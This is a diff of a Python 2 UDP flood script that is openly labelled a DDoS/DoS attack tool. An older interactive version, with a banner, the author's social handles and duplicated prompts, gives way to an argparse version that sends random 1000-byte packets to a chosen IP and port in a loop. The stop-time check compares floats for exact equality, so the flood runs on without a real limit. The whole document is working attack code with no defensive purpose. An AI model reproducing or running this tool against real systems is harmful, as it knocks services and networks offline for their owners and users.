@@ -1,59 +1,26 @@
-import sys
-import os
-import time
+import argparse
 import socket
 import random
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
- 
-#sistemismi
-os.system("clear")
-os.system("figlet DDos Attack")
-print "İnstagram   : oktayirkos2749"
-print "github   : https://github.com/oktayirkos2749"
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+import time
+banner="""
+Ne kadar bilirsen bil; söylediklerin karşındakinin anladığı kadardır.
+Mevlânâ Celaleddin-i Rumi
 
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
+"""
+parser = argparse.ArgumentParser(description="Dos By ./D3V1L-AL")
+parser.add_argument('-t','--target',help='Enter the target ip',required=True)
+parser.add_argument('-p','--port',help='Enter the target port',required=True)
+parser.add_argument('-d','--duration',help='Enter the duration in seconds',required=True)
+args = parser.parse_args()
+sck = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+rand_data = random._urandom(1000)
 sent = 0
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
-
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
-sent = 0
+time1 = time.time() + int(args.duration)
+while True:
+    sent += 1
+    sck.sendto(rand_data, (args.target,int(args.port)))
+    sck.sendto(rand_data, (args.target, int(args.port)))
+    sck.sendto(rand_data, (args.target, int(args.port)))
+    print "Attacking %s:%s | %s" % (args.target,args.port,sent)
+    if time.time() == time1:
+        break
